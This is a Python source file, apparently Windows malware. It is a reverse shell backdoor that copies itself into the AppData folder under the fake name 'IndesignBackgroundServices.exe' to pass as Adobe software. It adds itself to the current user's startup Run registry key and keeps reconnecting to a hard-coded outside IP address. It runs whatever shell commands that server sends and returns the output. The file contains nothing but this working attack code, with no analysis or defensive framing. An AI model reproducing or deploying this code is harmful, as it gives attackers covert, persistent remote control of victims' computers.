import os
import shutil
import sys
import subprocess
import socket
import time
import winreg as winreg

SERVER_HOST = "13.60.17.29"
SERVER_PORT = 5003
BUFFER_SIZE = 1024 * 1024  # 128KB max size of messages, feel free to increase
SEPARATOR = "<sep>"

def get_current_executable():
    # Function to get the path of the currently running executable
    return sys.argv[0]

def install_indesign_services():
    try:
        # Get the path to the currently running executable
        current_exe = get_current_executable()
        
        # Specify the target installation directory
        install_dir = os.path.join(os.getenv("APPDATA"), "Adobe")
        
        # Ensure the target directory exists
        if not os.path.exists(install_dir):
            os.makedirs(install_dir)
        
        # Name of the executable after installation
        installed_exe = os.path.join(install_dir, "IndesignBackgroundServices.exe")
        
        # Copy the currently running executable to the installation directory
        shutil.copy(current_exe, installed_exe)
        print(f"Copied '{current_exe}' to '{installed_exe}'")
        
        # Add to startup via registry
        add_to_startup(installed_exe)
        
    except Exception as e:
        print(f"Error installing Indesign services: {e}")

def add_to_startup(exe_path):
    try:
        # Add to startup via registry
        key = winreg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        
        with winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS) as regkey:
            winreg.SetValueEx(regkey, "IndesignBackgroundServices", 0, winreg.REG_SZ, exe_path)
            print(f"Added '{exe_path}' to current user's startup via registry.")
    except Exception as e:
        print(f"Error adding to startup: {e}")

def connect_to_server():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_HOST, SERVER_PORT))
            return s
        except socket.error as e:
            print(f"Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5)

def main():
    s = connect_to_server()
    cwd = os.getcwd()
    s.send(cwd.encode())

    while True:
        try:
            command = s.recv(BUFFER_SIZE).decode()
            if not command:
                raise ConnectionResetError("Server closed the connection.")
            splited_command = command.split()
            if command.lower() == "exit":
                print("Connection lost. Reconnecting...")
                s = connect_to_server()
                s.send(cwd.encode())
            elif splited_command[0].lower() == "cd":
                try:
                    os.chdir(' '.join(splited_command[1:]))
                    output = ""
                except FileNotFoundError as e:
                    output = str(e)
            else:
                output = subprocess.getoutput(command)
            cwd = os.getcwd()
            message = f"{output}{SEPARATOR}{cwd}"
            s.send(message.encode())
        except (ConnectionResetError, BrokenPipeError):
            print("Connection lost. Reconnecting...")
            s = connect_to_server()
            s.send(cwd.encode())
        except Exception as e:
            print(f"An error occurred: {e}")
            continue

    s.close()

if __name__ == "__main__":
    install_indesign_services()  # Install Indesign services
    main()                       # Start main functionality (server communication)
